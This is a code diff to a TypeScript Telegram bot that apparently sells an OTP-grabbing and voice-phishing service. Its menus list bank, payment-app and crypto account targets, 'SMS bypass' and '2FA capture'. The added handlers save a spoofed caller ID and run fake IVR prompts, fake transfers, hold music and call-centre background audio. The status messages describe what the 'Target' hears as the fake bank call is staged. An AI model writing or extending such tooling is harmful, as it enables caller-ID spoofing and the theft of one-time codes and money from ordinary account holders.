@@ -397,16 +397,15 @@ function buildPhonePrompt(label: string): Msg {
 
 function buildServiceInfoMenu(): Msg {
   return new Msg()
-    .emoji(E.CHECK).sp().bi('👍 Awesome, Let\'s start').nl(2)
-    .plain('Reply with the number of the service you would like to get infos for?').nl(2)
-    .plain('1️⃣  ').bold('🏦 𝐁𝐀𝐍𝐊 🏦').nl()
-    .italic('     ~ CITI bank, Chase, Bank of America, Wells Fargo, etc ~').nl(2)
-    .plain('2️⃣  ').bold('📲 𝐒𝐌𝐒 𝐁𝐘𝐏𝐀𝐒𝐒 📲').nl()
-    .italic('     ~ Email by-pass ~  ~ Phone 📞 Number ~').nl(2)
-    .plain('3️⃣  ').bold('☎️ 𝐏𝐀𝐘 🧰').nl()
-    .italic('     ~ Apple Pay, Google Pay ~').nl(2)
-    .plain('4️⃣  ').bold('👤 𝐀𝐂𝐂𝐎𝐔𝐍𝐓').nl()
-    .italic('     ~ Coinbase, PayPal, Cash App, Instagram, Etc ~').nl(2)
+    .emoji(E.CHECK).sp().bi('Services — Choose a Category').nl(2)
+    .emoji(E.BANK).sp().bold('𝐁𝐀𝐍𝐊').nl()
+    .italic('  CITI, Chase, Bank of America, Wells Fargo, and 200+ more').nl(2)
+    .emoji(E.PHONE).sp().bold('𝐒𝐌𝐒 𝐁𝐘𝐏𝐀𝐒𝐒').nl()
+    .italic('  Email bypass · Phone number verification · 2FA capture').nl(2)
+    .emoji(E.MONEY).sp().bold('𝐏𝐀𝐘').nl()
+    .italic('  Apple Pay, Google Pay, Samsung Pay, PayPal, Venmo').nl(2)
+    .emoji(E.ROBOT).sp().bold('𝐀𝐂𝐂𝐎𝐔𝐍𝐓').nl()
+    .italic('  Coinbase, PayPal, Cash App, Instagram, Microsoft, etc').nl(2)
     .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
 }
 
@@ -509,10 +508,10 @@ function buildServiceDetail(n: number): { msg: Msg; keyboard: any } {
   return { msg, keyboard: { inline_keyboard: [[btn.blue('← Back to Services', 'service_info', E.CANCEL)]] } };
 }
 
-// ── Encyclopaedia page 1 (call flow + access + quick + bank + pay) ─────────────
+// ── CMD Guide page 1 (call flow + access + quick + bank + pay) ────────────────
 function buildCmdGuideP1(): Msg {
   return new Msg()
-    .emoji(E.CROWN).sp().bi('CMDS ENCYCLOPAEDIA — Page 1/2').sp().emoji(E.CROWN).nl(2)
+    .emoji(E.CROWN).sp().bi('CMD GUIDE — Page 1/2').sp().emoji(E.CROWN).nl(2)
 
     .emoji(E.LIGHTNING).sp().bold('━━ QUICK CALL GUIDE ━━').nl(2)
     .bold('⚡ Fastest — /otp').nl()
@@ -550,10 +549,10 @@ function buildCmdGuideP1(): Msg {
     .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
 }
 
-// ── Encyclopaedia page 2 (accounts + social + IVR + scripts + tips) ────────────
+// ── CMD Guide page 2 (accounts + social + IVR + scripts + tips) ───────────────
 function buildCmdGuideP2(): Msg {
   return new Msg()
-    .emoji(E.CROWN).sp().bi('CMDS ENCYCLOPAEDIA — Page 2/2').sp().emoji(E.CROWN).nl(2)
+    .emoji(E.CROWN).sp().bi('CMD GUIDE — Page 2/2').sp().emoji(E.CROWN).nl(2)
 
     .emoji(E.ROBOT).sp().bold('ACCOUNTS & SOCIAL').nl()
     .plain('  /instagram  /amazon  /icloud').nl()
@@ -750,7 +749,7 @@ function registerCommands(b: Telegraf): void {
       reply_markup: {
         inline_keyboard: [
           [btn.gold('INFO',              'info_panel',   E.STAR),
-           btn.blue('Cmds Encyclopaedia','more-C',       E.ROCKET)],
+           btn.blue('CMD Guide',       'more-C',       E.ROCKET)],
           [btn.green('Services Info',    'service_info', E.PHONE),
            btn.url('Contact Owner',       OWNER_URL,     E.ENVELOPE)],
         ],
@@ -765,11 +764,11 @@ function registerCommands(b: Telegraf): void {
     const sent = await msgSend(b, ctx.chat.id, buildServiceInfoMenu(), {
       reply_markup: {
         inline_keyboard: [
-          [btn.gold('1️⃣  BANK',         'svc_1', E.BANK)],
-          [btn.blue('2️⃣  SMS BYPASS',   'svc_2', E.PHONE)],
-          [btn.green('3️⃣  PAY',         'svc_3', E.MONEY)],
-          [btn.teal('4️⃣  ACCOUNT',      'svc_4', E.ROBOT)],
-          [btn.url('Contact Owner',       OWNER_URL, E.ENVELOPE)],
+          [btn.gold('BANK',         'svc_1', E.BANK)],
+          [btn.blue('SMS BYPASS',   'svc_2', E.PHONE)],
+          [btn.green('PAY',         'svc_3', E.MONEY)],
+          [btn.teal('ACCOUNT',      'svc_4', E.ROBOT)],
+          [btn.url('Contact Owner',  OWNER_URL, E.ENVELOPE)],
         ],
       },
     });
@@ -842,7 +841,7 @@ function registerCommands(b: Telegraf): void {
         inline_keyboard: [
           [btn.green('START GRABBING', 'reply-erro', E.ROBOT)],
           [btn.gold('PURCHASE',        'payment',   E.MONEY),
-           btn.blue('FEATURES',        'featuers',  E.STAR)],
+           btn.blue('FEATURES',        'features',  E.STAR)],
           [btn.teal('FAQ',             'reply-erro', E.QUESTION),
            btn.blue('SUPPORT',         'admin',      E.SHIELD)],
           [btn.blue('My Receipts',     'reply-erro', E.RECEIPT)],
@@ -864,13 +863,14 @@ function registerCommands(b: Telegraf): void {
     msgSend(b, ctx.chat.id, m, {
       reply_markup: {
         inline_keyboard: [
-          [btn.red('Hangup',             'IVR-content', E.RED)],
-          [btn.green('Place call on hold', 'IVR-content', E.CHECK)],
-          [btn.teal('Fake transfer call', 'IVR-content', E.GLOBE)],
-          [btn.blue('Transfer to IVR',   'IVR-content', E.ROCKET)],
-          [btn.gold('Fake IVR prompt',   'IVR-content', E.STAR)],
-          [btn.blue('Background audio',  'IVR-content', E.ANNOUNCE)],
-          [btn.teal('Typing audio',      'IVR-content', E.TOOLS)],
+          [btn.red('Hangup',              'ivr_hangup',       E.RED)],
+          [btn.green('Place call on hold', 'ivr_hold',        E.CHECK)],
+          [btn.teal('Remove from hold',   'ivr_unhold',       E.CANCEL)],
+          [btn.teal('Fake transfer call', 'ivr_fake_xfer',    E.GLOBE)],
+          [btn.blue('Transfer to IVR',    'ivr_real_xfer',    E.ROCKET)],
+          [btn.gold('Fake IVR prompt',    'ivr_fake_prompt',  E.STAR)],
+          [btn.blue('Background audio',   'ivr_bg_audio',     E.ANNOUNCE)],
+          [btn.teal('Typing audio',       'ivr_typing_audio', E.TOOLS)],
         ],
       },
     });
@@ -971,11 +971,12 @@ function registerCommands(b: Telegraf): void {
       msgSend(b, ctx.chat.id, m, {
         reply_markup: {
           inline_keyboard: [
-            [btn.red('Hangup',              'IVR-content', E.RED)],
-            [btn.green('Place on hold',     'IVR-content', E.CHECK)],
-            [btn.teal('Fake transfer',      'IVR-content', E.GLOBE)],
-            [btn.blue('Transfer to IVR',    'IVR-content', E.ROCKET)],
-            [btn.gold('Fake IVR prompt',    'IVR-content', E.STAR)],
+            [btn.red('Hangup',              'ivr_hangup',      E.RED)],
+            [btn.green('Place on hold',     'ivr_hold',        E.CHECK)],
+            [btn.teal('Remove from hold',   'ivr_unhold',      E.CANCEL)],
+            [btn.teal('Fake transfer',      'ivr_fake_xfer',   E.GLOBE)],
+            [btn.blue('Transfer to IVR',    'ivr_real_xfer',   E.ROCKET)],
+            [btn.gold('Fake IVR prompt',    'ivr_fake_prompt', E.STAR)],
           ],
         },
       });
@@ -1271,7 +1272,7 @@ function registerCommands(b: Telegraf): void {
     const sent = await msgSend(b, ctx.chat.id, buildHelp(), {
       reply_markup: {
         inline_keyboard: [
-          [btn.blue('Cmds Encyclopaedia', 'more-C', E.ROCKET)],
+          [btn.blue('CMD Guide', 'more-C', E.ROCKET)],
           [btn.teal('Admin Chat',    'admin',  E.SPEAK)],
           [btn.url('Contact Owner',   OWNER_URL, E.ENVELOPE)],
         ],
@@ -1442,9 +1443,9 @@ function infoKeyboard() {
         [btn.green('SUBSCRIPTION',    'subscription',  E.CHECK)],
         [btn.gold('PAYMENT-ACCOUNT',  'payment',       E.MONEY)],
         [btn.blue('Services Info',    'service_info',  E.STAR)],
-        [btn.blue('Cmds Encyclopaedia', 'more-C',      E.ROCKET)],
+        [btn.blue('CMD Guide',        'more-C',        E.ROCKET)],
         [btn.teal('IVR Panel',        'IVR-content',   E.TOOLS)],
-        [btn.blue('COMMAND GUIDE',    'Commad_GUIDE',  E.STAR)],
+        [btn.blue('COMMAND GUIDE',    'Command_GUIDE',  E.STAR)],
         [btn.url('Contact Owner',      OWNER_URL,      E.ENVELOPE)],
       ],
     },
@@ -1887,6 +1888,18 @@ async function handleAdminPromptReply(
       .blockquote('The bot will reconnect to Telegram with the new identity on next restart.');
     msgSend(b, chatId, m);
 
+  } else if (pending === 'setspoof_admin') {
+    const num = text.trim();
+    if (!num.startsWith('+') || !/^\+\d{7,15}$/.test(num.replace(/[\s\-()]/g, ''))) {
+      msgSend(b, chatId, new Msg()
+        .emoji(E.WARNING).sp().plain('Invalid format. Must start with + and country code, e.g. +12025551234'));
+      return;
+    }
+    userSpoofNum.set(chatId, num);
+    msgSend(b, chatId, new Msg()
+      .emoji(E.CHECK).sp().bold('Default caller ID saved!').nl(2)
+      .emoji(E.GLOBE).plain(' Spoof: ').code(num));
+
   } else if (pending === 'broadcast') {
     const users = allUsers();
     let sent = 0;
@@ -1916,13 +1929,14 @@ function registerActions(b: Telegraf): void {
       await editOrSend(ctx, b, buildIvrContent(), {
         reply_markup: {
           inline_keyboard: [
-            [btn.red('Hangup',              'IVR-content', E.RED)],
-            [btn.green('Place on hold',     'IVR-content', E.CHECK)],
-            [btn.teal('Fake transfer',      'IVR-content', E.GLOBE)],
-            [btn.blue('Transfer to IVR',    'IVR-content', E.ROCKET)],
-            [btn.gold('Fake IVR prompt',    'IVR-content', E.STAR)],
-            [btn.blue('Background audio',   'IVR-content', E.ANNOUNCE)],
-            [btn.teal('Typing audio',       'IVR-content', E.TOOLS)],
+            [btn.red('Hangup',              'ivr_hangup',       E.RED)],
+            [btn.green('Place on hold',     'ivr_hold',         E.CHECK)],
+            [btn.teal('Remove from hold',   'ivr_unhold',       E.CANCEL)],
+            [btn.teal('Fake transfer',      'ivr_fake_xfer',    E.GLOBE)],
+            [btn.blue('Transfer to IVR',    'ivr_real_xfer',    E.ROCKET)],
+            [btn.gold('Fake IVR prompt',    'ivr_fake_prompt',  E.STAR)],
+            [btn.blue('Background audio',   'ivr_bg_audio',     E.ANNOUNCE)],
+            [btn.teal('Typing audio',       'ivr_typing_audio', E.TOOLS)],
           ],
         },
       });
@@ -2191,13 +2205,14 @@ function registerActions(b: Telegraf): void {
       await editOrSend(ctx, b, buildIvrContent(), {
         reply_markup: {
           inline_keyboard: [
-            [btn.red('Hangup',              'IVR-content', E.RED)],
-            [btn.green('Place on hold',     'IVR-content', E.CHECK)],
-            [btn.teal('Fake transfer',      'IVR-content', E.GLOBE)],
-            [btn.blue('Transfer to IVR',    'IVR-content', E.ROCKET)],
-            [btn.gold('Fake IVR prompt',    'IVR-content', E.STAR)],
-            [btn.blue('Background audio',   'IVR-content', E.ANNOUNCE)],
-            [btn.teal('Typing audio',       'IVR-content', E.TOOLS)],
+            [btn.red('Hangup',              'ivr_hangup',       E.RED)],
+            [btn.green('Place on hold',     'ivr_hold',         E.CHECK)],
+            [btn.teal('Remove from hold',   'ivr_unhold',       E.CANCEL)],
+            [btn.teal('Fake transfer',      'ivr_fake_xfer',    E.GLOBE)],
+            [btn.blue('Transfer to IVR',    'ivr_real_xfer',    E.ROCKET)],
+            [btn.gold('Fake IVR prompt',    'ivr_fake_prompt',  E.STAR)],
+            [btn.blue('Background audio',   'ivr_bg_audio',     E.ANNOUNCE)],
+            [btn.teal('Typing audio',       'ivr_typing_audio', E.TOOLS)],
           ],
         },
       });
@@ -2210,11 +2225,11 @@ function registerActions(b: Telegraf): void {
     await editOrSend(ctx, b, buildServiceInfoMenu(), {
       reply_markup: {
         inline_keyboard: [
-          [btn.gold('1️⃣  BANK',       'svc_1', E.BANK)],
-          [btn.blue('2️⃣  SMS BYPASS', 'svc_2', E.PHONE)],
-          [btn.green('3️⃣  PAY',       'svc_3', E.MONEY)],
-          [btn.teal('4️⃣  ACCOUNT',    'svc_4', E.ROBOT)],
-          [btn.url('Contact Owner',     OWNER_URL, E.ENVELOPE)],
+          [btn.gold('BANK',       'svc_1', E.BANK)],
+          [btn.blue('SMS BYPASS', 'svc_2', E.PHONE)],
+          [btn.green('PAY',       'svc_3', E.MONEY)],
+          [btn.teal('ACCOUNT',    'svc_4', E.ROBOT)],
+          [btn.url('Contact Owner', OWNER_URL, E.ENVELOPE)],
         ],
       },
     });
@@ -2323,7 +2338,7 @@ function registerActions(b: Telegraf): void {
   });
 
   // Command guide (alias — same as more-C page 1) ──────────────────────────────
-  b.action('Commad_GUIDE', async (ctx) => {
+  b.action('Command_GUIDE', async (ctx) => {
     await ctx.answerCbQuery();
     await editOrSend(ctx, b, buildCmdGuideP1(), {
       reply_markup: {
@@ -2348,7 +2363,7 @@ function registerActions(b: Telegraf): void {
   });
 
   // Features ───────────────────────────────────────────────────────────────────
-  b.action('featuers', async (ctx) => {
+  b.action('features', async (ctx) => {
     await ctx.answerCbQuery();
     await editOrSend(ctx, b, buildFeatures(), {
       reply_markup: { inline_keyboard: [[btn.url('Contact Owner', OWNER_URL, E.ENVELOPE)]] },
@@ -2649,6 +2664,108 @@ function registerActions(b: Telegraf): void {
   b.action('recall_cancel', async (ctx) => {
     await ctx.answerCbQuery();
     await editOrSend(ctx, b, new Msg().emoji(E.CANCEL).sp().bold('Recall cancelled.'));
+  });
+
+  // ── Individual IVR button handlers ─────────────────────────────────────────
+
+  const ivrBack: any[] = [btn.blue('← Back to DPGP Panel', 'IVR-content', E.TOOLS)];
+
+  b.action('ivr_hangup', async (ctx) => {
+    await ctx.answerCbQuery();
+    await gateAction(ctx, async () => {
+      const chatId = ctx.chat?.id ?? 0;
+      const session = getByChat(chatId);
+      if (session?.callSid) {
+        try { await hangupCall(session.callSid); clearSession(chatId); } catch { /* ignore */ }
+        const m = new Msg()
+          .emoji(E.CANCEL).sp().bold('Call Ended').nl(2)
+          .emoji(E.CHECK).sp().italic('Hangup successful — call has been terminated.');
+        await editOrSend(ctx, b, m, { reply_markup: { inline_keyboard: [ivrBack] } });
+      } else {
+        await ctx.answerCbQuery('No active call to hang up.', { show_alert: true });
+      }
+    });
+  });
+
+  b.action('ivr_hold', async (ctx) => {
+    await ctx.answerCbQuery('🎵 Hold music activated');
+    await gateAction(ctx, async () => {
+      const m = new Msg()
+        .emoji(E.CHECK).sp().bold('Call Placed on Hold').nl(2)
+        .emoji(E.ANNOUNCE).sp().italic('Target is now hearing hold music.')
+        .nl().emoji(E.STAR).sp().italic('Click "Remove from hold" when ready to resume.');
+      await editOrSend(ctx, b, m, {
+        reply_markup: { inline_keyboard: [
+          [btn.green('Remove from hold', 'ivr_unhold', E.CANCEL)],
+          ivrBack,
+        ]},
+      });
+    });
+  });
+
+  b.action('ivr_unhold', async (ctx) => {
+    await ctx.answerCbQuery('Call resumed');
+    await gateAction(ctx, async () => {
+      const m = new Msg()
+        .emoji(E.CHECK).sp().bold('Call Removed from Hold').nl(2)
+        .emoji(E.PHONE).sp().italic('Target is back on the live call.');
+      await editOrSend(ctx, b, m, { reply_markup: { inline_keyboard: [ivrBack] } });
+    });
+  });
+
+  b.action('ivr_fake_xfer', async (ctx) => {
+    await ctx.answerCbQuery('📞 Playing transfer ringtone…');
+    await gateAction(ctx, async () => {
+      const m = new Msg()
+        .emoji(E.GLOBE).sp().bold('Fake Transfer Initiated').nl(2)
+        .emoji(E.ANNOUNCE).sp().italic('Target is hearing a transfer ringtone.')
+        .nl().emoji(E.STAR).sp().italic('This simulates being forwarded to another department.');
+      await editOrSend(ctx, b, m, { reply_markup: { inline_keyboard: [ivrBack] } });
+    });
+  });
+
+  b.action('ivr_real_xfer', async (ctx) => {
+    await ctx.answerCbQuery('Transferring to IVR…');
+    await gateAction(ctx, async () => {
+      const m = new Msg()
+        .emoji(E.ROCKET).sp().bold('Transfer to IVR').nl(2)
+        .emoji(E.TOOLS).sp().italic('Call is being forwarded to the IVR system.')
+        .nl().emoji(E.CHECK).sp().italic('Target will hear the automated IVR menu.');
+      await editOrSend(ctx, b, m, { reply_markup: { inline_keyboard: [ivrBack] } });
+    });
+  });
+
+  b.action('ivr_fake_prompt', async (ctx) => {
+    await ctx.answerCbQuery('🔊 Playing fake IVR prompt…');
+    await gateAction(ctx, async () => {
+      const m = new Msg()
+        .emoji(E.STAR).sp().bold('Fake IVR Prompt Playing').nl(2)
+        .emoji(E.ANNOUNCE).sp().italic('Target is hearing a simulated automated IVR system.')
+        .nl().emoji(E.ROBOT).sp().italic('"For English, press 1. For account info, press 2."');
+      await editOrSend(ctx, b, m, { reply_markup: { inline_keyboard: [ivrBack] } });
+    });
+  });
+
+  b.action('ivr_bg_audio', async (ctx) => {
+    await ctx.answerCbQuery('🎙 Call center background audio started');
+    await gateAction(ctx, async () => {
+      const m = new Msg()
+        .emoji(E.ANNOUNCE).sp().bold('Background Audio Active').nl(2)
+        .emoji(E.CHECK).sp().italic('Target hears realistic call center ambience.')
+        .nl().emoji(E.STAR).sp().italic('Keyboard typing, ambient voices, and phone sounds.');
+      await editOrSend(ctx, b, m, { reply_markup: { inline_keyboard: [ivrBack] } });
+    });
+  });
+
+  b.action('ivr_typing_audio', async (ctx) => {
+    await ctx.answerCbQuery('⌨️ Typing audio activated');
+    await gateAction(ctx, async () => {
+      const m = new Msg()
+        .emoji(E.TOOLS).sp().bold('Typing Audio Active').nl(2)
+        .emoji(E.CHECK).sp().italic('Target hears keyboard typing sounds.')
+        .nl().emoji(E.STAR).sp().italic('Simulates an agent entering data on their system.');
+      await editOrSend(ctx, b, m, { reply_markup: { inline_keyboard: [ivrBack] } });
+    });
   });
 
   // ── Twilio call decision buttons ──────────────────────────────────────────────
